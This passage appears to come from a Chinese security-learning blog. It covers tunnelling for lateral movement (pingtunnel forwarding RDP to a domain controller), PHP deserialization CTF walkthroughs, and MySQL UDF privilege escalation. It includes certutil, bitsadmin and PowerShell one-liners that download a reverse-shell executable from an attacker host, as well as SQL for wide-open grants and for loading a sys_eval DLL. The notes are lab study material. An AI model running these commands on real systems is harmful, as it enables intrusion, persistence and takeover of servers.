<h4 id="域横向网络-amp-传输-amp-应用层隧道技术"><a href="#域横向网络-amp-传输-amp-应用层隧道技术" class="headerlink" title="域横向网络&amp;传输&amp;应用层隧道技术"></a>域横向网络&amp;传输&amp;应用层隧道技术</h4><p>隧道技术是为了解决：防火墙过滤问题  网络连接通信问题  数据回链封装问题</p>
<p>在数据通信被拦截的情况下，可以利用隧道技术封装改变通信协议进行绕过拦截。</p>
<p>如：CS MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信讯在问题等问题，都可以通过隧道技术解决。</p>
<h6 id="隧道技术前期的必备条件"><a href="#隧道技术前期的必备条件" class="headerlink" title="隧道技术前期的必备条件"></a>隧道技术前期的必备条件</h6><p>在用隧道之前要先探测对应隧道协议是否支持，如果不支持用这个隧道也没有用</p>
<h6 id="隧道原理"><a href="#隧道原理" class="headerlink" title="隧道原理"></a>隧道原理</h6><p>在实际的网络中，通常是用各种边界设备、软硬件防火墙以及入侵检测系统，隧道是指绕过端口屏蔽的通信方式</p>
<p>将数据包两端进行防火墙允许的方式封装，然后就可以穿过防火墙，进行通信，当数据包达到目的地时将数据包还原，并将还原后的数据包发送到相应的服务器上。</p>
<p>常用的隧道技术有以下三种：</p>
<p>网络层：ipv6隧道、ICMP隧道（伪造这个协议）</p>
<p>传输层：TCP隧道、UDP隧道、常用端口转发</p>
<p>应用层：SSH隧道、HTTP&#x2F;S隧道、DNS隧道</p>
<h6 id="网络应用层连通性检测"><a href="#网络应用层连通性检测" class="headerlink" title="网络应用层连通性检测"></a>网络应用层连通性检测</h6><p>可以建立各种层面的隧道，每个层面又有不同的协议，你得先确定支持哪个隧道协议，才能确定你要用那个隧道。</p>
<p>比如：一个网络层的icmp隧道，要检测是否支持ICMP就可以用ping检测目标主机，ping通就可以得到该主机支持ICMP协议。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/a3dd3b49072dc8442835ab5947bebe8a50d5d72d.png@768w_200h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="检测TCP协议（瑞士军刀：netcat）"><a href="#检测TCP协议（瑞士军刀：netcat）" class="headerlink" title="检测TCP协议（瑞士军刀：netcat）"></a>检测TCP协议（瑞士军刀：netcat）</h6><p>执行nc 命令（-vz检测TCP端口）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -vz &lt;IP&gt;&lt;端口&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/78fbfd4cda509b0161d2ab1aafbc8dffc69b879b.png@831w_116h_progressive.webp"
                      alt="img"
                ></p>
<p>（-uz）检测UDP端口</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -uz &lt;IP&gt; &lt;端口&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/49ce79858b1b27fefef12131097dd8c2e955c9be.png@549w_140h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h6><p>如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息</p>
<p>用“curl”工具，执行 curl &lt;IP 地址:端口&gt;命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/6c4ad43e6393edc186d61fc76bf4b86a0dbfc287.png@831w_207h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h6><p>nslookup时win自带的命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/7061afc7be4cbb13b3c590d995ecee433a05f10e.png@627w_324h_progressive.webp"
                      alt="img"
                ></p>
<p>dig时linux系统自带的命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/0e27d474e4b3cd57f169ec3d45168bf7b0c3be25.png@753w_132h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="pingtunnel工具的使用"><a href="#pingtunnel工具的使用" class="headerlink" title="pingtunnel工具的使用"></a>pingtunnel工具的使用</h6><p>pingtunnel的原理是把tcp&#x2F;udp&#x2F;sock5流量伪装icmp流量进行转发的工具</p>
<p>语法：</p>
<p>-p 表示连接 icmp 隧道另一端的机器IP（即目标服务器）</p>
<p>-lp 表示需要监听的本地tcp端口</p>
<p>-da指定需要转发的机器的IP（即目标内网某一机器的内网 IP）</p>
<p>-dp指定需要转发的机器的端口（即目标内网某一机器的内网端口）</p>
<p>-x设置连接的密码 </p>
<h6 id="靶场分析"><a href="#靶场分析" class="headerlink" title="靶场分析"></a>靶场分析</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/641c898428e69f32b54c85e1422075b383421816.png@831w_243h_progressive.webp"
                      alt="img"
                ></p>
<p>现在有一台攻击机叫hanker  xiaodi（下面简称hx）要实现对一个内网环境的域控DC的控制，但是hx处于76.xx的IP网段是不能连接到33.33这个内网网段的，但是可以通过域内一台开放外网接口的主机webserver与DC连接。</p>
<p>首先：</p>
<p>webserver： .&#x2F;ptunnel -x xiaodi 先部署工具</p>
<p>hx： .&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi</p>
<p>转发3389端口的请求数据给本地的1080</p>
<p>hx： rdesktop 127.0.0.1 1080</p>
<h4 id="横向移动中的文件传输-1"><a href="#横向移动中的文件传输-1" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h4><p>该知识用于在取得权限之后，发送木马文件，进一步取得控制</p>
<h6 id="通过网络共享-1"><a href="#通过网络共享-1" class="headerlink" title="通过网络共享"></a>通过网络共享</h6><h6 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h6><h6 id="通过windows自带工具"><a href="#通过windows自带工具" class="headerlink" title="通过windows自带工具"></a>通过windows自带工具</h6><p>certutil</p>
<p>certutil时Windows自带的命令工具，提供从网络下载文件的功能，所以可以部署一个自己事先在可控服务器中的恶意文件即可实现攻击。</p>
<p>执行：</p>
<p><code>	certutil -urlcache -split -f http://IP:port/shell.exe C:/reverse_tcp.exe</code></p>
<p>意思是通过certutil下载shell.exe，并保存在C:\reverse_top.exe</p>
<p>BITSAdmin</p>
<p>BITSAdmin是一个Windows命令行工具，可以用于创建、下载、上传作业，监视进度。win7以后自带</p>
<p>命令：</p>
<p><code>	bitsadmin /transfer test http://IP:Port/shell.exe C:\reverse_tcp.exe</code></p>
<p>PowerShell</p>
<p>可以通过创建WebClient对象来实现文件下载</p>
<p><code>	（New-Object Net.WebClient）.DownloadFile(&#39;http://IP:Port/shell.exe&#39;,&#39;C:\reverse_tcp.exe&#39;)</code></p>
]]></content>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2023/03/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h6 id="序列化就是将对象转换成字符串，数据格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象"><a href="#序列化就是将对象转换成字符串，数据格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象" class="headerlink" title="序列化就是将对象转换成字符串，数据格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象"></a>序列化就是将对象转换成字符串，数据格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</h6><h6 id="而反序列化相反"><a href="#而反序列化相反" class="headerlink" title="而反序列化相反"></a>而反序列化相反</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221006125723792.png"
                      alt="image-20221006125723792"
                ></p>
<h2 id="PHP语言方面"><a href="#PHP语言方面" class="headerlink" title="PHP语言方面"></a>PHP语言方面</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221006125237103.png"
                      alt="image-20221006125237103"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221006130726968.png"
                      alt="image-20221006130726968"
                ></p>
<p>#触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法（魔术方法触发条件：1.反序列化2.存在类2.类中存在魔术方法）：</p>
<p>__construct()&#x2F;&#x2F;创建对象时触发</p>
<p>__destruct() &#x2F;&#x2F;对象被销毁时触发</p>
<p>__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p>
<p>__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</p>
<p>__get() &#x2F;&#x2F;用于从不可访问的属性读取数据</p>
<p>__set() &#x2F;&#x2F;用于将数据写入不可访问的属性</p>
<p>__isset() &#x2F;&#x2F;在不可访问的属性上调用 isset()或 empty()触发</p>
<p>__unset() &#x2F;&#x2F;在不可访问的属性上使用 unset()时触发</p>
<p>__invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</p>
<p>先搞一把 PHP 反序列化热身题稳住-无类问题-本地</p>
<ol>
<li>序列化</li>
</ol>
<p>#代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/107b2839dfa4459085aa6d3ae3e6c56e10fb1ea1.png@378w_119h_progressive.webp"
                      alt="img"
                ></p>
<p>#序列化后的格式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ae2689d3c4e1c628443ca17dbb1d5b77a6b0c4f6.png@821w_282h_progressive.webp"
                      alt="img"
                ></p>
<p>#结果（这里没对象，因此从变量的数据类型s开始）</p>
<p>—string（字符串）；变量长度为6；变量名“xiaodi”</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/86b84fd2c8d846be944cbe2efb27d66a3a783f38.png@258w_51h_progressive.webp"
                      alt="img"
                ></p>
<ol start="2">
<li>反序列化</li>
</ol>
<p>#代码&#x3D;》结果（注意里面有“”，外面只能为单引号‘‘）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/883dcdd91c5507536123aaef5fc1e325d82ecd99.png@387w_104h_progressive.webp"
                      alt="img"
                ></p>
<p>3.本地源代码分析</p>
<p>—类之前</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ae7b8390488e37ca37e356e7eedf79f818b9016d.png@789w_464h_progressive.webp"
                      alt="img"
                ></p>
<p>—flag文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/8c30a28c570889ae1c2594e05976af82dd605aee.png@450w_122h_progressive.webp"
                      alt="img"
                ></p>
<p>—类的内容（包含的魔术方法）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/8c75addc10af0eaa204991b839c9cbcf17c69199.png@831w_449h_progressive.webp"
                      alt="img"
                ></p>
<p>—类之后（主函数）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/483139f9863f5099a0f42a7ca819688996ea1484.png@566w_236h_progressive.webp"
                      alt="img"
                ></p>
<ol start="3">
<li>访问脚本</li>
</ol>
<p>—这里参数不等，所以显示源代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/7debf97f1d0840558db1855597d169c065ee67d8.png@831w_416h_progressive.webp"
                      alt="img"
                ></p>
<p>—输入参数s:6:”xiaodi”;（执行了包含文件）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/560707902f91b56c845c5639ee806c6d55211f8a.png@831w_218h_progressive.webp"
                      alt="img"
                ></p>
<ol start="4">
<li>key&#x3D;123</li>
</ol>
<p>—str&#x3D;i(数字型没有长度)<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/0ab8eceff950f3ea98800acd4f0de7e01720fca6.png@300w_66h_progressive.webp"
                      alt="img"
                ></p>
<p>—key&#x3D;’123’(变成字符串)<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/6961ec408c6e16a9c7712d0e21d9f6b66807dd05.png@173w_41h_progressive.webp"
                      alt="img"
                ></p>
<p>在撸一把 CTF 反序列化小真题压压惊-无类执行-实例</p>
<ol>
<li>理论分析（题目找不到，只能理论分析）</li>
</ol>
<p>—表单是死的，点不动，根据提示发现是传参</p>
<ol start="2">
<li>源代码分析</li>
</ol>
<p>—包含flag.php文件</p>
<p>—如果get传参不为空，就显示源码</p>
<p>—如果get没传数据，cookie传参反序列化和包含文件的key相等（注意是&#x3D;&#x3D;&#x3D;，即要求数值型也要相等），就输出flag变量</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b9deb8e451a6b1bcc43f9977761cf861c3c244d7.png@831w_642h_progressive.webp"
                      alt="img"
                ></p>
<ol start="3">
<li>解题分析（重点）</li>
</ol>
<p>—$key赋值在下方，所以前面判断的时候key为空（代码执行的先后顺序问题）</p>
<p>—要执行cookie，get传递的参数应该为空</p>
<p>—应该将空序列化（注意空不是空格）</p>
<p>然后抗一把 CTF 反序列化练习题围观下-有类魔术方法触发-本地</p>
<ol>
<li>执行本地代码</li>
</ol>
<p>—创建对象触发construct方法，输出构造函数</p>
<p>—反序列化触发wakeup方法，输出苏醒函数（序列化会检查方法内是否存在sleep函数，如果存在就优先调用；反序列化就调用wakeup函数）</p>
<p>—最后一个程序结束后触发destruct函数，输出析构函数</p>
<p>—如果有tostring函数，存在echo时或者拼接字符串时都会被调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ec3cb316f70d64697aa1d6605dff99a39a867ec0.png@576w_453h_progressive.webp"
                      alt="img"
                ></p>
<p>—结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/3ec041f3a99ef724b8b58f8a7c2487581b6f0475.png@680w_141h_progressive.webp"
                      alt="img"
                ></p>
<p>最后顶一把网鼎杯 2020 青龙大真题舒服下-有类魔术方法触发-实例</p>
<ol>
<li>靶场源代码分析</li>
</ol>
<p>#主函数（传递参数有效就将参数反序列化）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/eca2355345d2e80678fe102f37a0a1ea154cab42.png@831w_369h_progressive.webp"
                      alt="img"
                ></p>
<p>#类之前（包含文件，高亮源代码）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/94b7e769c91a429f3f7892a21b69ba0b4913bab5.png@318w_122h_progressive.webp"
                      alt="img"
                ></p>
<p>#类的源代码</p>
<p>第一：获取 flag 存储 flag.php</p>
<p>第二：两个魔术方法__destruct __construct</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/3296161e64b53d5bd821f1e0d6183eb552794d73.png@806w_360h_progressive.webp"
                      alt="img"
                ></p>
<p>第三：传输 str 参数数据后触发 destruct（反序列化之后，相当于添加了一个对象（但是不会触发construct方法，因为是反序列化得来的）。但是会在最后触发destruct方法），存在 is_valid 过滤（如果OP&#x3D;&#x3D;&#x3D;2，赋值为1；否则就将content赋值为空，调用process方法）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/6bb11455f4872c691e0df24efcf001705db18ce9.png@621w_200h_progressive.webp"
                      alt="img"
                ></p>
<p>第四：__destruct 中会调用 process,其中 op&#x3D;1 就写入， op&#x3D;2 就调用读取方法并且赋值给res，再打印res（output（）为打印）,否则就输出坏黑客。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/10ab0390ab548cec6332c9c6764d5776686ac228.png@776w_312h_progressive.webp"
                      alt="img"
                ></p>
<p>#写入（OP&#x3D;1写入）</p>
<p>—如果filename和content都存在，并且content的长度小于100，就将content写入filename，并且输出成功。否则输出失败。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/165c60a65d871366dfbab60073b6110be4bef70b.png@831w_299h_progressive.webp"
                      alt="img"
                ></p>
<p>#读取（OP&#x3D;2读取）</p>
<p>—如果filename存在，就读取文件。并且打印读取的内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e02e16a2b26f910b0d350633166723c9e5e21caf.png@831w_218h_progressive.webp"
                      alt="img"
                ></p>
<p>第五：涉及对象 FileHandler，变量 op 及 filename,content，进行构造输出</p>
<p>#原理解析（涉及：反序列化魔术方法调用，弱类型绕过，ascii 绕过）</p>
<p>—-使用该类对 flag 进行读取，这里面能利用的只有__destruct 函数（析构函数）。</p>
<p>—-__destruct 函数对$this-&gt;op 进行了&#x3D;&#x3D;&#x3D;判断并内容在 2 字符串时会赋值为 1（但是process 函数中使用&#x3D;&#x3D;对$this-&gt;op 进行判断（为 2 的情况下才能读取内容））</p>
<p>—-因此这里存在弱类型比较，可以使用数字 2 或字符串’ 2’绕过判断。</p>
<p>—-is_valid 函数还对序列化字符串进行了校验，因为成员被 protected 修饰，因此序列化字符串中会出现 ascii 为 0 的字符。经过测试，在 PHP7.2+的环境中，使用 public 修饰成员并序列化，反序列化后成员也会被 public 覆盖修饰</p>
<p>总结：</p>
<p>—传参Str&#x3D;》destruct方法（强类型对比）</p>
<p>—OP值对比&#x3D;&#x3D;&#x3D;类型 值</p>
<p>—OP&#x3D;‘ 2’字符串；OP&#x3D;‘2’不成立</p>
<p>—成立，强制op&#x3D;1，反之OP&#x3D;你设置的值</p>
<p>—process（）弱类型对比，将’ 2’和‘2’对比是一致的</p>
<ol start="2">
<li>设置含类的反序列化</li>
</ol>
<p>—要修改原来代码的protect的三个变量（因为原类没有值），只能重新构造filehandler类</p>
<p>—重新构造类之后，序列化类传参</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/666424fcb84169e30f425c07c3b90299b5f138db.png@825w_300h_progressive.webp"
                      alt="img"
                ></p>
<p>#序列化结果</p>
<p>—o表示object对象</p>
<p>—11是对象名的长度</p>
<p>—“FileHandler”为对象名称</p>
<p>—对象中有3个变量</p>
<p>—3个变量的变量类型都是string</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2d036c56254c983fff180654b539a42e4423664a.png@566w_71h_progressive.webp"
                      alt="img"
                ></p>
<p>#将反序列化的语句序列化验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/148734bc1e1de1d005bf6f91b21c852876bed9dc.png@831w_195h_progressive.webp"
                      alt="img"
                ></p>
<ol start="3">
<li>传递参数</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/cc5ad2c775c548ad2e666257f2dda0955ffdfb06.png@831w_122h_progressive.webp"
                      alt="img"
                ></p>
<ol start="4">
<li><p>查看源代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/5b160682c3c05c4d5a892c2606e3871c474303a2.png@810w_227h_progressive.webp"
                      alt="img"
                ></p>
</li>
</ol>
<h2 id="JAVA语言方面"><a href="#JAVA语言方面" class="headerlink" title="JAVA语言方面"></a>JAVA语言方面</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221009143751313.png"
                      alt="image-20221009143751313"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>数据库提权</title>
    <url>/2023/05/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h2><p>主要是要通过mysql权限——&gt;进而获得操作系统权限</p>
<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>UDF 全称user defined function 又叫 用户自定义函数，是通过添加新函数，实现mysql中无法通过函数实现功能的拓展，就比如MySQL没有这个函数，我们可以自己添加进去，然后就可以用我们自己添加的函数了</p>
<h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>我们需要知道mysql数据库的用户名和密码，并且可以远程登录（相当于获得了MySQL数据库权限）</p>
<p>mysql具有写入文件的权限：就是secure_file_priv的值为空</p>
<p>但是在这些操作之前需要知道，一般MySQL数据库只允许本地登入，虽然在知道账号密码的情况下我们可以通过navicat连接，但是如果只能本地连接的话就要去获得高权限来获得rdp远程连接的权限</p>
<p>我们可以通过更改mysql配置文件来开启远程登陆</p>
<p>在mysql目录下&#x2F;etc&#x2F;mysql&#x2F;my.conf文件，将bind-address&#x3D;127.0.0.1改成0.0.0.0</p>
<p>但是还有账号限制，需要给远程登陆用户赋予权限，首先可以创建一个admin&#x2F;123456用户，使用%来允许任意IP登陆</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all on *.* to admin@&#x27;%&#x27; identified by &#x27;123456&#x27; with grant option;</span><br></pre></td></tr></table></figure></div>



<p>另外：mysql提权后获得的最大权限是和服务器登入的账号有关的，如果是普通账号登入的话最大权限也只能是普通账户权限，如果是管理员登入的话，提权后就是系统管理员权限</p>
<h4 id="手动提权"><a href="#手动提权" class="headerlink" title="手动提权"></a>手动提权</h4><p>先查看MySQL是否具有写入文件的权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure></div>

<p>secure_file_priv是用来限制load、dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限</p>
<p>secure_file_priv值为null 表示不允许导入导出</p>
<p>secure_file_priv值为&#x2F;tmp&#x2F;，表示限制导入，导出只能在&#x2F;tmp&#x2F;目录下</p>
<p>secure_file_priv值为空，则不限制</p>
<p>这个表示不允许导入导出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417200508085.png"
                      alt="image-20230417200508085"
                ></p>
<p>这个表示不做任何限制</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417200538917.png"
                      alt="image-20230417200538917"
                ></p>
<p>如何更改，在mysql目录中my.ini在最后添加一行<code>secure_file_priv=&#39;&#39;</code>即可，重启apache服务即可</p>
<p>接下来我们就要上传UDF动态链接库文件</p>
<p>所谓的动态链接库文件就是一种实现共享函数库的一种方式，在Windows环境下后缀名为.dll，linux环境就是.so，文件包含执行系统命令的一些函数</p>
<p>那这个文件在哪？？？？</p>
<p>这个文件在sqlmap、msf中都有的其实</p>
<p>具体目录在\sqlmap\data\udf\mysql里面有linux和windows的32位、64位版本，我们需要知道数据库服务器用哪个版本系统，执行以下命令查询</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@version_compile_os, @@version_compile_machine;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203102013.png"
                      alt="image-20230417203102013"
                ></p>
<p>我这个是Windows64位的所以就上传Windows 64位的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203205586.png"
                      alt="image-20230417203205586"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203254751.png"
                      alt="image-20230417203254751"
                ></p>
<p>可以看出，这里的文件是.dll_结尾的，这是由于sqlmap为了防止被误杀经过了编码处理，不能别直接使用，需要解码，在sqlmap自带解码py脚本在\sqlmap\extra\cloak下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203537255.png"
                      alt="image-20230417203537255"
                ></p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure></div>

<p>即可</p>
<p>解码后的文件就恶意上传了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417204509877.png"
                      alt="image-20230417204509877"
                ></p>
<p>Mysql版本小于5.1：<br>如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。<br>如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。</p>
<p>这里说一下为什么一定要是system32目录下。因为在MYSQL5之后，对DLL注册做了限制，所对应的DLL不能包含’&#x2F;‘或者’’，也就是说不能是绝对路径，所以这里我们放到system32系统环境变量中直接调用，可以规避这个限制</p>
<p>Mysql版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。</p>
<p>我们的数据库版本大于5.1需要创建一个plugin文件夹，但是我们只是获得mysql权限，怎么在他的系统下创建文件夹</p>
<p>可以利用NTFS流进行创建</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;E:\phpstudy\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin::$INDEX_ALLOCATION&#x27;;</span><br></pre></td></tr></table></figure></div>

<p>但是报错了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417205832997.png"
                      alt="image-20230417205832997"
                ></p>
<p>自己创一个吧……..</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;plugin%&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417210024594.png"
                      alt="image-20230417210024594"
                ></p>
<p>然后就可以将刚才的.dll文件放到plugin里面了</p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#x27;C:\\Windows\\System32\\cmd.exe\\lib_mysqludf_sys_64.dll&#x27;)) into dumpfile &#x27;E:\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin&#x27;;</span><br><span class="line"></span><br><span class="line">这里windows下目录结构要进行转义双写</span><br></pre></td></tr></table></figure></div>

<p>不行！！！直接拖进去吧，唉~~</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211718980.png"
                      alt="image-20230417211718980"
                ></p>
<p>那个方法说是可能传输不全可以用十六进制来</p>
<p>那个代码网站贴这了</p>
<p><a class="link"   href="https://www.sqlsec.com/tools/udf.html" >https://www.sqlsec.com/tools/udf.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>上传之后执行以下指令，创建自定义函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211838441.png"
                      alt="image-20230417211838441"
                ></p>
<p>查看是否创建成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
